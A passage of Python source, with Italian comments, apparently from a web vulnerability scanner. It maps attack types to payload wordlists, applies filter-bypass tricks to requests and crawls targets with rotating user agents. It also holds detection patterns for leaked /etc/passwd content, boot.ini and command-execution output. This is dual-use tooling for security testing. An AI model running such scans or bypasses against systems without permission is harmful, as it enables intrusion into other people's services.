                'payloads': [
                    'SQL Injection/Intruder/Auth_Bypass.txt'
                ]
            },
            'css_injection': {
                'payloads': [
                    'XSS Injection/Intruders/CSS-Injection.txt'
                ]
            },
            'nosqli': {
                'fuzzdb': [
                    'attack/no-sql-injection/mongodb.txt'
                ],
                'payloads': [
                    'NoSQL Injection/Intruder/MongoDB.txt',
                    'NoSQL Injection/Intruder/NoSQL.txt'
                ],
                'seclists': [
                    'Fuzzing/Databases/NoSQL.txt'
                ]
            },
            'crlf': {
                'fuzzdb': [
                    'attack/http-protocol/crlf-injection.txt'
                ],
                'payloads': [
                    'CRLF Injection/Files/crlfinjection.txt'
                ]
            },
            'cors': {
                'payloads': [
                    'CORS Misconfiguration/README.md'
                ]
            },
            'csv_injection': {
                'payloads': [
                    'CSV Injection/README.md'
                ]
            },
            'deserialization': {
                'payloads': [
                    'Insecure Deserialization/Files/',
                    'Insecure Deserialization/PHP.md',
                    'Insecure Deserialization/Java.md',
                    'Insecure Deserialization/Python.md'
                ]
            },
            'graphql': {
                'payloads': [
                    'GraphQL Injection/README.md'
                ]
            },
            'smuggling': {
                'payloads': [
                    'Request Smuggling/README.md'
                ]
            },
            'race_condition': {
                'payloads': [
                    'Race Condition/README.md'
                ]
            },
            'saml': {
                'payloads': [
                    'SAML Injection/README.md'
                ]
            },
            'ssi': {
                'fuzzdb': [
                    'attack/server-side-include/server-side-includes-generic.txt'
                ],
                'payloads': [
                    'Server Side Include Injection/Files/ssi_esi.txt'
                ],
                'seclists': [
                    'Fuzzing/SSI-Injection-Jhaddix.txt'
                ]
            },
            'xpath': {
                'fuzzdb': [
                    'attack/xpath/xpath-injection.txt'
                ],
                'payloads': [
                    'XPATH Injection/README.md'
                ]
            },
            'xslt': {
                'payloads': [
                    'XSLT Injection/Files/'
                ]
            },
            'cache_deception': {
                'payloads': [
                    'Web Cache Deception/README.md'
                ]
            },
            'websocket': {
                'payloads': [
                    'Web Sockets/Files/ws-harness.py'
                ]
            },
            'jwt': {
                'payloads': [
                    'JSON Web Token/README.md'
                ]
            },
            'prototype_pollution': {
                'payloads': [
                    'Prototype Pollution/README.md'
                ]
            },
            'dom_clobbering': {
                'payloads': [
                    'DOM Clobbering/README.md'
                ]
            },
            'mass_assignment': {
                'payloads': [
                    'Mass Assignment/README.md'
                ]
            },
            'type_juggling': {
                'payloads': [
                    'Type Juggling/README.md'
                ]
            },
            'latex': {
                'payloads': [
                    'LaTeX Injection/README.md'
                ]
            },
            'oauth': {
                'payloads': [
                    'OAuth Misconfiguration/README.md'
                ]
            },
            'orm': {
                'payloads': [
                    'ORM Leak/README.md'
                ]
            },
            'prompt_injection': {
                'payloads': [
                    'Prompt Injection/README.md'
                ]
            },
            'regex': {
                'payloads': [
                    'Regular Expression/README.md'
                ]
            },
            'hpp': {
                'fuzzdb': [
                    'attack/http-protocol/hpp.txt'
                ],
                'payloads': [
                    'HTTP Parameter Pollution/README.md'
                ]
            },
            'tabnabbing': {
                'payloads': [
                    'Tabnabbing/README.md'
                ]
            },
            'zip_slip': {
                'payloads': [
                    'Zip Slip/README.md'
                ]
            },
            'unicode': {
                'fuzzdb': [
                    'attack/unicode/'
                ],
                'seclists': [
                    'Fuzzing/Unicode.txt'
                ]
            },
            'format_string': {
                'fuzzdb': [
                    'attack/format-strings/format-strings.txt'
                ],
                'seclists': [
                    'Fuzzing/FormatString-Jhaddix.txt'
                ]
            },
            'integer_overflow': {
                'fuzzdb': [
                    'attack/integer-overflow/integer-overflows.txt'
                ]
            },
            'control_chars': {
                'fuzzdb': [
                    'attack/control-chars/'
                ],
                'seclists': [
                    'Fuzzing/special-chars.txt'
                ]
            },
            'business_logic': {
                'fuzzdb': [
                    'attack/business-logic/'
                ],
                'payloads': [
                    'Business Logic Errors/README.md'
                ]
            },
            'json': {
                'fuzzdb': [
                    'attack/json/JSON_Fuzzing.txt'
                ],
                'seclists': [
                    'Fuzzing/JSON.Fuzzing.txt'
                ]
            },
            'polyglot': {
                'seclists': [
                    'Fuzzing/Polyglots/SQLi-Polyglots.txt',
                    'Fuzzing/Polyglots/XSS-Polyglots.txt',
                    'Fuzzing/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt'
                ]
            },
            'dos': {
                'payloads': [
                    'Denial of Service/README.md'
                ]
            },
            'dns': {
                'payloads': [
                    'DNS Rebinding/README.md'
                ]
            },
            'hidden_params': {
                'payloads': [
                    'Hidden Parameters/README.md'
                ]
            },
            'iosec': {
                'payloads': [
                    'Insecure Direct Object References/README.md'
                ]
            }
        }
    
    def get_wordlists_for_vulnerability(self, vuln_type, technology=None):
        """
        Get appropriate wordlists for a vulnerability type.

        ENHANCED: Usa intelligent scanning se abilitato (use_intelligent_scan=True),
        altrimenti fallback al mapping statico (backward compatible).
        """
        wordlists = []

        # Intelligent scanning mode
        if self.use_intelligent_scan:
            intelligent_files = self._find_wordlist_files_intelligent(vuln_type, technology)

            if intelligent_files:
                for filepath in intelligent_files:
                    source = 'unknown'
                    for src_name, base_path in self.base_paths.items():
                        if filepath.startswith(base_path):
                            source = src_name
                            break

                    wordlists.append({
                        'source': source,
                        'path': filepath,
                        'relative_path': filepath.replace(self.base_paths.get(source, ''), '').lstrip('/')
                    })

                return wordlists

        # FALLBACK: Old static mapping (backward compatible)
        if vuln_type not in self.wordlist_map:
            return wordlists

        vuln_lists = self.wordlist_map[vuln_type]

        # Build full paths
        for source, paths in vuln_lists.items():
            if source in self.base_paths:
                for path in paths:
                    full_path = f"{self.base_paths[source]}/{path}"
                    wordlists.append({
                        'source': source,
                        'path': full_path,
                        'relative_path': path
                    })

        return wordlists

    def get_internal_payloads(self, vuln_type):
        """
        Get internal fallback payloads for a vulnerability type.
        Usato quando i wordlist esterni non sono disponibili.
        """
        vuln_type_lower = vuln_type.lower()
        return self.INTERNAL_PAYLOADS.get(vuln_type_lower, [])

    # ========== INTELLIGENT SCANNER METHODS ==========

    def _find_wordlist_files_intelligent(self, vuln_type, technology=None, max_depth=5):
        """
        Scansione ricorsiva intelligente delle wordlist directories.
        Trova TUTTI i file che matchano vulnerability + technology.

        Args:
            vuln_type: Tipo vulnerabilità
            technology: Stack tecnologico (opzionale)
            max_depth: Profondità massima ricerca

        Returns:
            Lista di path assoluti ai file wordlist
        """
        # Normalize technology: accept string, list, dict, or None
        if isinstance(technology, dict):
            # Extract tech names from dict (e.g. self.results['technologies'])
            tech_str = None
            for key in technology:
                val = str(key).lower() if key else ''
                if val:
                    tech_str = val
                    break
            technology = tech_str
        elif isinstance(technology, (list, set)):
            # Take first element if list
            technology = str(technology[0]).lower() if technology else None
        elif technology is not None:
            technology = str(technology).lower()

        cache_key = f"{vuln_type}_{technology}"
        if cache_key in self.intelligent_cache:
            return self.intelligent_cache[cache_key]

        found_files = []
        vuln_keywords = self.vuln_keywords.get(vuln_type, [vuln_type])
        tech_keywords = self.tech_keywords.get(technology, [technology]) if technology else []

        for source_name, base_dir in self.base_paths.items():
            if not os.path.exists(base_dir):
                continue

            for root, dirs, files in os.walk(base_dir):
                depth = root[len(base_dir):].count(os.sep)
                if depth > max_depth:
                    continue

                root_lower = root.lower()

                dir_matches_vuln = any(kw in root_lower for kw in vuln_keywords)

                if not dir_matches_vuln:
                    continue

                for filename in files:
                    if not self._is_wordlist_file(filename):
                        continue

                    filepath = os.path.join(root, filename)
                    filename_lower = filename.lower()

                    file_matches_vuln = any(kw in filename_lower for kw in vuln_keywords)

                    file_matches_tech = True
                    if technology and tech_keywords:
                        file_matches_tech = any(kw in filename_lower or kw in root_lower for kw in tech_keywords)

                    if file_matches_vuln and file_matches_tech:
                        found_files.append(filepath)

        found_files = list(set(found_files))
        self.intelligent_cache[cache_key] = found_files

        return found_files

    def _is_wordlist_file(self, filename):
        """Check se il file è una wordlist valida"""
        text_extensions = ['.txt', '.fuzz', '.list', '.wordlist', '.payloads', '.md']
        ignore_extensions = ['.jpg', '.png', '.gif', '.zip', '.tar', '.gz', '.exe', '.dll', '.py', '.sh']

        filename_lower = filename.lower()

        if any(filename_lower.endswith(ext) for ext in ignore_extensions):
            return False

        if any(filename_lower.endswith(ext) for ext in text_extensions):
            return True

        if '.' not in filename:
            return True

        return False

    def load_payloads_from_files(self, file_paths, max_payloads=200):
        """
        Carica payload da lista di file e deduplica.

        Args:
            file_paths: Lista di path ai file wordlist
            max_payloads: Massimo numero payload da ritornare

        Returns:
            Lista di payload deduplicati
        """
        payloads = []

        for filepath in file_paths:
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()

                        if not line or line.startswith('#'):
                            continue

                        if len(line) > 10000:
                            continue

                        special_chars = sum(1 for c in line if not c.isprintable())
                        if special_chars > len(line) * 0.3:
                            continue

                        payloads.append(line)

            except Exception:
                pass

        payloads = sorted(set(payloads))

        return payloads[:max_payloads]


class DiscoveryWordlistMapper:
    """Map detected technologies to appropriate discovery wordlists"""
    
    def __init__(self, base_paths):
        self.base_paths = base_paths
        self.discovery_map = {
            'generic': [
                'SecLists/Discovery/Web-Content/common.txt',
                'SecLists/Discovery/Web-Content/quickhits.txt',
                'SecLists/Discovery/Web-Content/raft-small-directories.txt',
                'SecLists/Discovery/Web-Content/raft-small-files.txt'
            ],
            'wordpress': [
                'SecLists/Discovery/Web-Content/CMS/wordpress.txt',
                'SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt'
            ],
            'drupal': [
                'SecLists/Discovery/Web-Content/CMS/Drupal.txt'
            ],
            'joomla': [
                'SecLists/Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt'
            ],
            'php': [
                'SecLists/Discovery/Web-Content/PHP.fuzz.txt',
                'SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt'
            ],
            'asp.net': [
                'SecLists/Discovery/Web-Content/IIS.fuzz.txt'
            ],
            'java': [
                'SecLists/Discovery/Web-Content/tomcat.txt'
            ],
            'python': [
                'SecLists/Discovery/Web-Content/django.txt'
            ],
            'api': [
                'SecLists/Discovery/Web-Content/api/api-endpoints.txt'
            ]
        }
    
    def get_wordlists(self, technology):
        """Get wordlists for a specific technology"""
        wordlists = []
        
        if technology in self.discovery_map:
            for wordlist_path in self.discovery_map[technology]:
                # Try each base path
                for base_name, base_path in self.base_paths.items():
                    # Fix case sensitivity for SecLists
                    if base_name == 'seclists':
                        wordlist_path = wordlist_path.replace('SecLists/', '')
                    
                    full_path = os.path.join(base_path, wordlist_path)
                    if os.path.exists(full_path):
                        wordlists.append({
                            'path': full_path,
                            'source': base_name,
                            'technology': technology
                        })
                        break
        
        return wordlists


class BypassManager:
    """Manage and apply bypasses from application_traceroute with technology stack"""
    
    def __init__(self, bypass_file=None):
        self.bypasses = []
        self.validated_bypasses = []
        self.technology_stack = {}
        self.infrastructure = {}
        
        if bypass_file:
            self.load_bypasses_from_json(bypass_file)
    
    def load_bypasses_from_json(self, filename):
        """Load bypasses from application_traceroute JSON output"""
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
            
            # Extract technology stack (NEW FORMAT)
            self.technology_stack = data.get('technology_stack', {})
            
            # Extract infrastructure details
            self.infrastructure = {
                'chain': data.get('infrastructure_chain', []),
                'fingerprints': data.get('infrastructure_fingerprints', {}),
                'discrepancies': data.get('discrepancies_found', [])
            }
            
            self.bypasses = data.get('bypasses', [])
            
            # Filter only validated bypasses
            self.validated_bypasses = [
                bypass for bypass in self.bypasses 
                if bypass.get('validated', False)
            ]
            
            logger.info(f"Loaded technology stack: {self.technology_stack}")
            logger.info(f"Loaded infrastructure: {self.infrastructure['chain']}")
            logger.info(f"Loaded {len(self.bypasses)} total bypasses, {len(self.validated_bypasses)} validated")
            
            if self.validated_bypasses:
                for bypass in self.validated_bypasses:
                    logger.info(f"  ✅ {bypass['type']}: {bypass['description']}")
            else:
                logger.warning("No validated bypasses found in file")
                
        except Exception as e:
            logger.error(f"Failed to load bypasses from {filename}: {e}")
    
    def apply_bypass_to_request(self, url, bypass, payload="", method="GET"):
        """Apply a specific bypass to a request"""
        try:
            parsed = urlparse(url)
            
            # Build request parameters
            request_params = {
                'url': url,
                'method': method,
                'timeout': 10,
                'verify': False,
                'allow_redirects': True
            }
            
            # Apply bypass based on type
            if bypass['type'] == 'Unicode Bypass':
                # Unicode path bypass
                if 'path' in bypass['curl_data']:
                    bypass_path = bypass['curl_data']['path']
                    request_params['url'] = f"{parsed.scheme}://{parsed.netloc}{bypass_path}"
                    if payload:
                        if '?' in request_params['url']:
                            request_params['url'] += f"&payload={urllib.parse.quote(payload)}"
                        else:
                            request_params['url'] += f"?payload={urllib.parse.quote(payload)}"
            
            elif bypass['type'] == 'Encoding Bypass':
                # Base64 or other encoding bypass
                if 'path' in bypass['curl_data']:
                    bypass_path = bypass['curl_data']['path']
                    if bypass_path.startswith('/?path='):
                        if payload:
                            encoded_payload = base64.b64encode(payload.encode()).decode()
                            request_params['url'] = f"{parsed.scheme}://{parsed.netloc}/?path={encoded_payload}"
                        else:
                            request_params['url'] = f"{parsed.scheme}://{parsed.netloc}{bypass_path}"
                    else:
                        request_params['url'] = f"{parsed.scheme}://{parsed.netloc}{bypass_path}"
                        if payload:
                            if '?' in request_params['url']:
                                request_params['url'] += f"&payload={urllib.parse.quote(payload)}"
                            else:
                                request_params['url'] += f"?payload={urllib.parse.quote(payload)}"
            
            elif bypass['type'] == 'Path Bypass':
                # Path traversal bypass
                if 'path' in bypass['curl_data']:
                    bypass_path = bypass['curl_data']['path']
                    request_params['url'] = f"{parsed.scheme}://{parsed.netloc}{bypass_path}"
                    if payload:
                        if '?' in request_params['url']:
                            request_params['url'] += f"&payload={urllib.parse.quote(payload)}"
                        else:
                            request_params['url'] += f"?payload={urllib.parse.quote(payload)}"
            
            elif 'Buffer Overflow Bypass' in bypass['type']:
                # Buffer overflow bypass with large headers
                if 'headers' in bypass['curl_data']:
                    request_params['headers'] = bypass['curl_data']['headers'].copy()
                    if payload:
                        if '?' in url:
                            request_params['url'] = f"{url}&payload={urllib.parse.quote(payload)}"
                        else:
                            request_params['url'] = f"{url}?payload={urllib.parse.quote(payload)}"
            
            else:
                # Generic bypass - just add payload to URL
                if payload:
                    if '?' in url:
                        request_params['url'] = f"{url}&payload={urllib.parse.quote(payload)}"
                    else:
                        request_params['url'] = f"{url}?payload={urllib.parse.quote(payload)}"
            
            return request_params
            
        except Exception as e:
            logger.error(f"Error applying bypass {bypass['type']}: {e}")
            return None


class SmartCrawler:
    """Advanced web crawler with JS analysis and smart endpoint discovery"""
    
    def __init__(self, target_url, max_depth=3, max_pages=1000, verbose=False, auth_config=None, debug_mode=False):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.verbose = verbose
        self.debug_mode = debug_mode
        self.visited_urls = set()

        # Initialize vulnerability logger FIRST (creates output directory)
        self.vuln_logger = VulnerabilityLogger(target_url)
        self.results_dir = self.vuln_logger.output_dir  # Store for other outputs
        print(f"  📁 Results directory: {self.results_dir}")

        # Initialize debug logger if debug mode enabled (uses same directory)
        self.debug_logger = None
        if debug_mode and DEBUG_LOGGER_AVAILABLE:
            self.debug_logger = DebugLogger(output_dir=self.results_dir, enabled=True)
            print(f"  🐛 Debug mode enabled - logging to: {self.debug_logger.output_file}")
        elif debug_mode and not DEBUG_LOGGER_AVAILABLE:
            print("  ⚠ Debug mode requested but debug_logger module not available")

        # Initialize vulnerability verifier with learning
        self.vuln_verifier = None
        if VERIFIER_AVAILABLE:
            self.vuln_verifier = VulnerabilityVerifier(enable_learning=True)
            print("  🔬 Vulnerability verifier enabled with auto-learning")
        else:
            print("  ⚠ Vulnerability verifier not available - using basic detection")

        # Initialize payload mutation engine
        self.mutation_engine = None
        if MUTATION_ENGINE_AVAILABLE:
            self.mutation_engine = PayloadMutationEngine()
            print("  🧬 Payload mutation engine enabled")

        # Initialize native detector (pure Python, no external tools)
        self.native_detector = None
        if NATIVE_DETECTOR_AVAILABLE:
            self.native_detector = VulnDetector(timeout=10, verify_ssl=False)
            print("  🧪 Native detector enabled (time-based/boolean-based SQLi, XSS)")
        else:
            print("  ⚠ Native detector not available - using wordlist-based detection only")

        # Sistema di deduplicazione avanzato
        # Traccia parametri testati per evitare test ridondanti su URL diversi
        # Chiave: (param_name, vuln_type) -> valore: set di URL dove è stato testato
        self.tested_params_vulns = {}

        # Backward compatibility (deprecated but kept for now)
        self.tested_dynamic_params = set()
        self.tested_path_segments = set()
        self.tested_query_params = set()
        self.tested_hash_params = set()
        self.tested_form_params = set()

        # Queue con limite per evitare OOM con discovery aggressivo
        self.url_queue = queue.Queue(maxsize=5000)
        self.endpoints = []
        self.forms = []
        # vuln_logger already initialized at top of __init__

        # Inizializza rate limiter e performance monitor
        self.rate_limiter = RateLimiter(requests_per_second=5)
        self.performance_monitor = PerformanceMonitor()

        # Hash set per payload validation (evita test duplicati)
        self.tested_payloads_hash = set()

        # Circuit breaker: skip URLs after repeated failures
        self._url_error_counts = {}  # url -> consecutive error count
        self._url_circuit_broken = set()  # URLs to skip entirely
        self._CIRCUIT_BREAKER_THRESHOLD = 3  # Skip URL after N consecutive errors

        # ⚡ REGEX PRECOMPILATE per evitare ricompilazione ripetuta
        self._compile_regex_patterns()

        # Setup session with retry strategy
        base_session = requests.Session()

        # Retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        base_session.mount("http://", adapter)
        base_session.mount("https://", adapter)

        # Wrap with DebugSession if debug mode is enabled
        if self.debug_logger:
            self.session = DebugSession(base_session, self.debug_logger)
        else:
            self.session = base_session

        # Rotating User-Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
        ]
        
        # Set initial headers
        self._rotate_user_agent()
        
        # Initialize components
        self.tech_detector = TechnologyDetector()
        self.param_analyzer = ParameterAnalyzer()
        
        # Set default base paths
        self.default_base_paths = {
            'fuzzdb': '/usr/share/wordlists/fuzzdb',
            'payloads': '/usr/share/wordlists/PayloadsAllTheThings',
            'seclists': '/usr/share/wordlists/SecLists'
        }
        
        self.wordlist_mapper = WordlistMapper(self.default_base_paths)
        self.discovery_mapper = DiscoveryWordlistMapper(self.default_base_paths)
        
        # Initialize behavioral engine
        self.behavioral_engine = BehavioralContextEngine()
        
        # Initialize authentication with debug logger
        self.auth_manager = AuthenticationManager(debug_logger=self.debug_logger)
        if auth_config:
            auth_result = self.auth_manager.setup_authentication(self.session, auth_config)
            # Sync session cookies with native detector after authentication
            if auth_result and self.native_detector:
                self._sync_native_detector_cookies()

        # Bypass manager - will be set if bypass file provided
        self.bypass_manager = None
        
        # Results storage
        self.results = {
            'target': target_url,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'technologies': {},
            'endpoints': [],
            'forms': [],
            'javascript_files': [],
            'api_endpoints': [],
            'interesting_files': [],
            'comments': [],
            'emails': [],
            'potential_vulnerabilities': defaultdict(list),
            'vulnerability_test_results': [],  # Store immediate test results
            'behavioral_analysis_results': []  # Store behavioral analysis results
        }
    
    def set_bypass_manager(self, bypass_manager):
        """Set the bypass manager for the crawler"""
        self.bypass_manager = bypass_manager
        
        # Pass technology stack to behavioral engine
        if bypass_manager and bypass_manager.technology_stack:
            self.behavioral_engine.set_technology_hints(bypass_manager.technology_stack)
            
            # Update results with technology from bypass file
            self.results['technologies'].update({
                'infrastructure': bypass_manager.infrastructure,
                'stack': bypass_manager.technology_stack
            })
        
        if self.verbose and bypass_manager and bypass_manager.validated_bypasses:
            print(f"🔧 Bypass Manager initialized with {len(bypass_manager.validated_bypasses)} validated bypasses")
            print(f"📊 Technology Stack: {bypass_manager.technology_stack}")

    # Limiti dinamici per tipo di vulnerabilità
    # Vuln critiche (RCE, SQLi) meritano più test su URL diversi
    DYNAMIC_LIMITS_BY_VULN_TYPE = {
        'rce': 30,       # Critico - testare su molti endpoint
        'sqli': 28,      # Critico - testare su molti endpoint
        'xxe': 25,       # Alto impatto
        'ssti': 25,      # Alto impatto
        'lfi': 25,       # Alto impatto
        'ldapi': 22,     # Medio-alto
        'xpath': 22,     # Medio-alto
        'open_redirect': 20,  # Medio
        'crlf': 18,      # Medio
        'csrf': 15,      # Medio-basso (spesso falsi positivi)
        'xss': 15,       # Più comune, meno test necessari per param
    }

    # Default per tipi non elencati
    DEFAULT_MAX_TESTS = 20

    def _calculate_dynamic_limit(self, vuln_type, confidence=None):
        """
        Calcola il limite dinamico di test per parametro basandosi su:
        1. Tipo di vulnerabilità (critiche → più test)
        2. Confidence della predizione (alta → più test)
        3. Dimensione del sito (più endpoint → limiti più alti proporzionalmente)

        Returns:
            int: numero massimo di URL su cui testare questo param+vuln
        """
        # Base limit dal tipo di vulnerabilità
        base_limit = self.DYNAMIC_LIMITS_BY_VULN_TYPE.get(
            vuln_type, self.DEFAULT_MAX_TESTS
        )

        # Confidence boost: alta confidence → +30% test ammessi
        if confidence is not None:
            if confidence >= 80:
                base_limit = int(base_limit * 1.3)
            elif confidence >= 65:
                base_limit = int(base_limit * 1.15)
            elif confidence < 45:
                # Bassa confidence → riduci per evitare spreco
                base_limit = int(base_limit * 0.7)

        # Site size scaling: siti grandi hanno più endpoint da coprire
        total_endpoints = len(self.endpoints) if hasattr(self, 'endpoints') else 0
        if total_endpoints > 100:
            # Siti grandi: scala leggermente il limite (max +50%)
            scale_factor = min(1.5, 1.0 + (total_endpoints - 100) / 500)
            base_limit = int(base_limit * scale_factor)
        elif total_endpoints < 10:
            # Siti piccoli: testa quasi tutto, nessuna riduzione
            base_limit = max(base_limit, 25)

        return base_limit

    def should_test_parameter(self, param_name, vuln_type, url=None, max_tests_per_param=None, confidence=None):
        """
        Verifica se un parametro dovrebbe essere testato per una specifica vulnerabilità.

        Implementa deduplicazione intelligente con limiti DINAMICI:
        - Limite base per tipo di vulnerabilità (RCE/SQLi: 28-30, XSS: 15)
        - Boost per alta confidence (+30% se >= 80)
        - Scaling per dimensione sito (siti grandi → limiti proporzionali)
        - Evita di testare lo stesso parametro per la stessa vuln su URL identici
        - Permette di testare un parametro su un numero limitato di URL diversi

        Args:
            param_name: Nome del parametro
            vuln_type: Tipo di vulnerabilità (xss, sqli, lfi, etc.)
            url: URL dove è stato trovato il parametro (opzionale)
            max_tests_per_param: Override manuale del limite (None = calcolo dinamico)
            confidence: Confidence della predizione (0-100, per calcolo dinamico)

        Returns:
            True se il parametro dovrebbe essere testato, False altrimenti
        """
        # Normalizza il tipo di vulnerabilità
        vuln_type = vuln_type.lower().strip()

        # Crea chiave unica per parametro+vulnerabilità
        key = (param_name, vuln_type)

        # Se non è mai stato testato, testalo
        if key not in self.tested_params_vulns:
            return True

        # Se è stato testato ma non abbiamo l'URL, assumiamo che non debba essere ritestato
        if url is None:
            return False

        # Normalizza l'URL (rimuove parametri query e fragment per confronto)
        parsed = urlparse(url)
        normalized_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        tested_urls = self.tested_params_vulns[key]

        # Se è già stato testato su questo URL, skippa
        if normalized_url in tested_urls:
            if self.verbose:
                logger.debug(f"⏭️  Skipping {param_name} ({vuln_type}) - already tested on {normalized_url}")
            return False

        # Calcola limite dinamico (o usa override manuale)
        effective_limit = max_tests_per_param if max_tests_per_param is not None else self._calculate_dynamic_limit(vuln_type, confidence)

        # Se è stato testato su troppi URL diversi, skippa (evita loop)
        if len(tested_urls) >= effective_limit:
            if self.verbose:
                logger.debug(f"⏭️  Skipping {param_name} ({vuln_type}) - already tested on {len(tested_urls)}/{effective_limit} URLs")
            return False

        return True

    def mark_parameter_tested(self, param_name, vuln_type, url=None):
        """
        Marca un parametro come testato per una specifica vulnerabilità.

        Args:
            param_name: Nome del parametro
            vuln_type: Tipo di vulnerabilità testata
            url: URL dove è stato testato (opzionale)
        """
        vuln_type = vuln_type.lower().strip()
        key = (param_name, vuln_type)

        if key not in self.tested_params_vulns:
            self.tested_params_vulns[key] = set()

        if url:
            parsed = urlparse(url)
            normalized_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            self.tested_params_vulns[key].add(normalized_url)

            if self.verbose:
                logger.debug(f"✅ Marked {param_name} ({vuln_type}) as tested on {normalized_url}")

    def _compile_regex_patterns(self):
        """
        Compila tutte le regex usate frequentemente per evitare ricompilazione.

        Le regex vengono compilate una volta durante __init__ e riutilizzate.
        Migliora performance di ~15-20% in detection methods.
        """
        # Regex per XSS detection
        self.xss_patterns = {
            'script_tag': re.compile(r'<script[^>]*>', re.I),
            'javascript_protocol': re.compile(r'javascript:', re.I),
            'event_handler': re.compile(r'on\w+\s*=', re.I),
            'img_tag': re.compile(r'<img[^>]*>', re.I),
            'svg_tag': re.compile(r'<svg[^>]*>', re.I),
            'iframe_tag': re.compile(r'<iframe[^>]*>', re.I),
            'object_tag': re.compile(r'<object[^>]*>', re.I),
            'embed_tag': re.compile(r'<embed[^>]*>', re.I),
        }

        # Regex per SQL injection detection
        self.sqli_patterns = [
            re.compile(r'SQL syntax.*MySQL', re.I),
            re.compile(r'Warning.*mysql_', re.I),
            re.compile(r'MySQLSyntaxErrorException', re.I),
            re.compile(r'valid MySQL result', re.I),
            re.compile(r'PostgreSQL.*ERROR', re.I),
            re.compile(r'Warning.*\Wpg_', re.I),
            re.compile(r'valid PostgreSQL result', re.I),
            re.compile(r'PSQLException', re.I),
            re.compile(r'Driver.*SQL[\s\-\_]*Server', re.I),
            re.compile(r'OLE DB.*SQL Server', re.I),
            re.compile(r'SQLServer JDBC Driver', re.I),
            re.compile(r'SqlException', re.I),
            re.compile(r'Unclosed quotation mark', re.I),
            re.compile(r'Oracle.*Driver', re.I),
            re.compile(r'Warning.*oci_', re.I),
            re.compile(r'OracleException', re.I),
            re.compile(r'SQLite.*Exception', re.I),
            re.compile(r'System.Data.SQLite.SQLiteException', re.I),
            re.compile(r'Warning.*sqlite_', re.I),
            re.compile(r'SQL\s*command\s*not\s*properly\s*ended', re.I),
            re.compile(r'Query\s*failed', re.I),
            re.compile(r'syntax error at or near', re.I),
            re.compile(r"You have an error in your SQL syntax", re.I),
            re.compile(r'mysqldump', re.I),
            re.compile(r'Oracle.*Parser', re.I),
            re.compile(r'unrecognized token', re.I),
            re.compile(r'mysql_fetch_array\(\)', re.I),
            re.compile(r'mysqli::query\(\)', re.I),
            re.compile(r'pg_exec\(\)', re.I),
        ]

        # Regex per LFI detection - SOLO pattern specifici per evitare FP
        # Questi pattern DEVONO essere specifici per contenuto di file di sistema
        self.lfi_patterns = [
            # /etc/passwd - formato completo con shell
            re.compile(r'root:[x\*]:0:0:[^:]*:[^:]*:/bin/\w+', re.M),
            re.compile(r'daemon:[x\*]:1:1:', re.M),
            re.compile(r'nobody:[x\*]:65534:65534:', re.M),
            # Windows boot.ini - con contenuto tipico
            re.compile(r'\[boot\s*loader\]\s*\r?\n\s*timeout\s*=', re.I | re.M),
            re.compile(r'multi\(0\)disk\(0\)rdisk\(0\)', re.I | re.M),
            # Apache config - SOLO se contiene direttive complete
            re.compile(r'^<VirtualHost\s+[\*\d\.]+:\d+>', re.I | re.M),
            # Windows dir output
            re.compile(r'Volume\s+Serial\s+Number\s+is\s+[A-F0-9]{4}-[A-F0-9]{4}', re.I | re.M),
            re.compile(r'Directory\s+of\s+[A-Z]:\\', re.I | re.M),
        ]

        # Regex per RCE detection - SOLO output specifico di comandi
        self.rce_patterns = [
            # id command output - formato completo
            re.compile(r'uid=\d+\(\w+\)\s+gid=\d+\(\w+\)', re.M),
            # uname -a output
            re.compile(r'Linux\s+\S+\s+\d+\.\d+\.\d+[^\s]*\s+#\d+', re.M),
            # Windows ver output
            re.compile(r'Microsoft\s+Windows\s+\[Version\s+\d+\.\d+\.\d+', re.I | re.M),
            # ps output header
            re.compile(r'^\s*PID\s+TTY\s+TIME\s+CMD\s*$', re.M),
            # ping output
            re.compile(r'\d+\s+bytes\s+from\s+[\d\.]+:.*ttl=\d+', re.I | re.M),
        ]

        # Regex per safe context check
        self.safe_context_patterns = {
            'html_comment': re.compile(r'<!--[\s\S]*?-->'),
            'js_line_comment': re.compile(r'//.*$', re.M),
            'js_block_comment': re.compile(r'/\*[\s\S]*?\*/', re.S),
            'cdata': re.compile(r'<!\[CDATA\[[\s\S]*?\]\]>', re.I | re.S),
        }

        logger.debug("✅ Regex patterns compiled successfully")

    def cleanup(self):
        """
        Pulizia risorse prima della chiusura.

        Chiude connessioni HTTP, svuota cache, logga statistiche finali.
        Chiamare questo metodo al termine della scansione per evitare memory leak.
        """
        try:
            # Log statistiche finali
            if hasattr(self, 'performance_monitor'):
                self.performance_monitor.log_stats(prefix="Final Stats")

            # Chiudi sessione HTTP
            if hasattr(self, 'session'):
                self.session.close()
                logger.debug("HTTP session closed")

            # Svuota cache
            if hasattr(self, 'behavioral_engine') and hasattr(self.behavioral_engine, 'cache'):
                self.behavioral_engine.cache.clear()
                logger.debug("Behavioral cache cleared")

            # Svuota results per liberare memoria
            if hasattr(self, 'results'):
                self.results.clear()

            # Svuota queue
            if hasattr(self, 'url_queue'):
                while not self.url_queue.empty():
                    try:
                        self.url_queue.get_nowait()
                    except queue.Empty:
                        break

            logger.info("✅ Cleanup completed successfully")

        except Exception as e:
